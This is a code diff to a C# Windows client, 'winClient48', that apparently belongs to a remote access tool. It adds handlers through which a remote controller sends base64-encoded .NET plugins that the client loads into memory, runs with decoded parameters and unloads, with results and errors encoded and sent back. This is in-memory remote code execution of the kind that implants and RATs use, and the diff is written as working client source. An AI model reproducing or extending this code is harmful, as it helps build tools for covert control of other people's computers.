@@ -48,6 +48,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Xml.Linq;
 
 namespace winClient48
 {
@@ -2202,7 +2203,7 @@ namespace winClient48
                         var context = new clsPluginContext();
                         m_pluginMgr = new clsPluginMgr(context);
                     }
-
+                    
                     if (cmd[1] == "ls")
                     {
                         var plugins = m_pluginMgr.Plugins;
@@ -2222,46 +2223,97 @@ namespace winClient48
                     }
                     else if (cmd[1] == "load")
                     {
+                        string szName = cmd[2];
                         try
                         {
-                            string szName = cmd[2];
-                            byte[] abPluginBuffer = Convert.FromBase64String(cmd[3]);
-
-                            m_pluginMgr.Load(abPluginBuffer);
+                            Invoke(new Action(() =>
+                            {
+                                m_pluginMgr.Load(Convert.FromBase64String(cmd[3]));
+                            }));
 
                             v.fnSendCommand(new string[]
                             {
                                 "plugin",
                                 "load",
                                 szName,
+                                "1",
                             });
                         }
                         catch (ReflectionTypeLoadException ex)
                         {
-                            MessageBox.Show(ex.Message);
+                            v.fnSendCommand(new string[]
+                            {
+                                "plugin",
+                                "load",
+                                szName,
+                                "0",
+                            });
+                        }
+                    }
+                    else if (cmd[1] == "unload")
+                    {
+                        string szName = cmd[2];
+                        try
+                        {
+                            m_pluginMgr.Unload(szName);
+                            v.fnSendCommand(new string[]
+                            {
+                                "plugin",
+                                "unload",
+                                szName,
+                                "1",
+                            });
+                        }
+                        catch (Exception ex)
+                        {
+                            m_pluginMgr.Unload(szName);
+                            v.fnSendCommand(new string[]
+                            {
+                                "plugin",
+                                "unload",
+                                szName,
+                                "0",
+                                Crypto.b64E2Str(ex.Message),
+                            });
                         }
                     }
                     else if (cmd[1] == "run")
                     {
+                        string szName = cmd[2];
+
                         try
                         {
-                            string szName = cmd[2];
+                            List<string[]> lsPayload = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).Select(y => y.Split('=')).ToList();
                             var dic = new Dictionary<string, object>();
-
-                            for (int i = 3; i < cmd.Length; i++)
+                            foreach (string[] s in lsPayload)
                             {
-                                string szItem = Crypto.b64D2Str(cmd[i]);
-                                string[] s = szItem.Split('=');
+                                if (s.Length < 2)
+                                    continue;
 
                                 dic.Add(s[0], s[1]);
                             }
 
                             var ret = m_pluginMgr.Execute(szName, dic);
 
+                            v.fnSendCommand(new string[]
+                            {
+                                "plugin",
+                                "run",
+                                szName,
+                                "1",
+                                Crypto.b64E2Str(ret.ToString()),
+                            });
                         }
                         catch (Exception ex)
                         {
-
+                            v.fnSendCommand(new string[]
+                            {
+                                "plugin",
+                                "run",
+                                szName,
+                                "0",
+                                Crypto.b64E2Str(ex.Message),
+                            });
                         }
                     }
                 }
